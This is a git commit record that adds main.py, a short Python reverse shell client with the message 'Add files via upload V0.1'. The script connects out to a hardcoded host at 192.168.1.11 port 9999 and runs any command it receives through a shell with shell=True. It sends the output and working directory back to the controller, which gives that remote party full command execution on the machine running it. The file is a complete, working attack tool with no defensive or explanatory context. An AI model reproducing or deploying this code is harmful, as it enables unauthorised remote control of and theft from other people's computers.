d4d44686239469dd94b3677ce69bc410e504b4ee
Zestafoni <47298453+Zestafoni@users.noreply.github.com>
2019-02-25 19:45:53 +0400

    Add files via upload
    V0.1

---
+++ main.py
@@ -0,0 +1,27 @@
+import socket
+import subprocess
+import os
+
+
+
+s = socket.socket()
+host = '192.168.1.11'
+port = 9999
+
+s.connect((host,port))
+
+while True:
+	data = s.recv(1024)
+	if data[:2].decode('UTF-8') == 'cd':
+		os.chdir(data[3:].decode('UTF-8'))
+	#CMD 
+	if len(data) > 0:
+		cmd = subprocess.Popen(data.decode('UTF-8'), shell = True, stdout = subprocess.PIPE, stdin = subprocess.PIPE, stderr = subprocess.PIPE)
+		out_bytes = cmd.stdout.read() + cmd.stderr.read()
+		out_str = out_bytes.decode('UTF-8', 'ignore')
+		curr_wd = os.getcwd() + '(-_-) -> '
+		s.send((curr_wd + out_str).encode())
+		
+		
+		
+		
